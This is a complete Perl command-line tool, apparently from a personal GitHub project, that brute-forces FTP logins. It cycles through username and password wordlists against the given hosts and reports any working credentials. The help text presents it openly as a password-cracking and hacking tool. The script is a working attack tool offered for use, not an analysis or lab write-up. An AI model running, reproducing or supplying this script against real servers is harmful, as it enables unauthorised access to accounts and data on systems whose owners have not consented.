#!/usr/bin/env perl

use strict;
use warnings;
use Net::FTP;
use Getopt::Long;

#Colors
my $R = "\033[1;31m";
my $G = "\033[1;32m";
my $B = "\033[1;34m";
my $Y = "\033[1;33m";
my $W = "\033[1;37m";
my $N = "\033[0m";
my $SUCCESS = "${W}[$G+$W]";
my $FAILURE = "${W}[$R-$W]";
my $WARNING = "${W}[$Y!$W]";

#Banner
my $banner = <<BANNER;
$G ____ ________ ____  ${W}____              _              ${B}     _
$G|  __/__   __/|  _ \\$W|  _ \\ _ __ _  _ _| |__  ___    ${B} ____ | |
$G|  _/   | |   |  __/$W|    /| '_/| || |_   _/ / _ \\   ${B}|  _ \\| |
$G| |     | |   | |   $W|  _ \\| |  | || | | |_ |  __/ _ ${B}|  __/| |__
$G|_|     |_|   |_|   $W|____/|_|  |____|  \\__||___/ (_)${B}| |    \\___|
$W                                                     ${B}\\|
$W                     By ${R}LvMalware Drk ${N}

BANNER

$| = 1;

$SIG{INT} = sub { print "\n$WARNING Process aborted.\n"; exit(0) };

sub login
{
    my ($host, $port, $username, $password, $timeout) = @_;
    my $ftp = Net::FTP->new(
        Host    => $host,
        Port    => $port,
        Timeout => $timeout || 5
    ) || die "\n$FAILURE Can't connect to $host:$port";
    $ftp->login($username, $password);
}

sub get_password
{
    my ($host, $port, $username, $wordlist, $timeout) = @_;
    open(my $passwords, '<', $wordlist) ||
    die "\n$FAILURE Can't open $wordlist for reading: $!";
    my $last_len = 0;
    
    while (my $pwd = <$passwords>)
    {
        chomp($pwd);
        erase_line();
        print "\r$SUCCESS Trying password: $pwd";
        return $pwd if login($host, $port, $username, $pwd, $timeout)
    }
    close($passwords);
    undef;
}

sub up_line { (print("\x1b[1A") && $|++) for 1 .. ($_[0] || 1) }

sub erase_line { print("\x1b[2K") && $|++ }

sub get_user_pass
{
    my ($host, $port, $user_wordlist, $pass_wordlist, $timeout) = @_;
    open(my $users, '<', $user_wordlist) ||
    die "\n$FAILURE Can't open $user_wordlist for reading: $!";
    my $first = 1;
    while (my $usr = <$users>)
    {
        unless ($first)
        {
            up_line();
            erase_line();
        }
        else
        {
            $first = 0;
        }
        chomp($usr);
        print "\r$SUCCESS Trying user: $usr\n";
        my $pwd = get_password($host, $port, $usr, $pass_wordlist, $timeout);
        return ($usr, $pwd) if defined($pwd);
    }
    close($users);
    (undef, undef);
}

sub version
{
    print "0.2 beta\n";
    exit;
}

sub help
{
    print <<HELP;
Crack FTP passwords using brute force.

Usage: $0 [options] <target(s)>

Options:
    -v, --version                   Show the version and exit
    -h, --help                      Show this help message and exit
    -p, --port                      Set the port to connect (default = 21)
    -u, --users                     Set the usernames wordlist to be used
    -w, --wordlist                  Set the passwords wordlist to be used
    -t, --timeout                   Set timeout value in seconds (default = 0.3)

Examples:
    $0 -u users.txt -w pass.txt ftp.example.com
    $0 -p 2121 -u users.txt -w /usr/share/dict/words 127.0.0.1
    $0 -t 2 -u usr -w passwords ftp.name.domain

Note:
        Brute force is probably the least efficient method of hacking anything,
    but sometimes it's all we can use. Also, this tool can be a little slower
    compared to others that perform the same function.
        The default timeout is 0.3 s, but depending on you network connection
    and server location, you may need to specify a bigger value using the option
    --timeout. Of course, this will slow down the entire process even more.

Author:
    Lucas V. Araujo <lucas.vieira.ar\@disroot.org>
    GitHub: https://github.com/LvMalware/

HELP
    exit(0)
}

sub main
{
    print $banner;

    my ($timeout, $port) = (0.3, 21);
    my ($users, $wordlist);
    GetOptions(
        'help'  => \&help,
        'port=i' => \$port,
        'users=s' => \$users,
        'version'  => \&version,
        'timeout=f' => \$timeout,
        'wordlist=s' => \$wordlist,
    );

    unless (@ARGV > 0)
    {
        print "Usage: $0 [options] <target(s)>\n";
        print "Try --help for more information about usage.\n";
        exit(0);
    }

    unless ($users)
    {
        print "$WARNING You must provide an usernames wordlist.\n";
        exit(1)
    }

    unless ($timeout > 0)
    {
        print "$WARNING Invalid timeout value.\n";
        exit(1)
    }

    unless ($wordlist)
    {
        print "$WARNING You must provide a passwords wordlist.\n";
        exit(1)
    }

    for my $target (@ARGV)
    {
        print "$SUCCESS Trying to crack the password for: $target:$port\n";
        my ($user, $pass) = get_user_pass($target, $port, $users, $wordlist, $timeout);
        if (defined($user) && defined($pass))
        {
            print "\n$SUCCESS Password found!\n";
            print "$SUCCESS Username: $user\n";
            print "$SUCCESS Password: $pass\n";

        }
        else
        {
            print "\n$FAILURE Password not found.\n";
        }
    }
}

main() unless caller;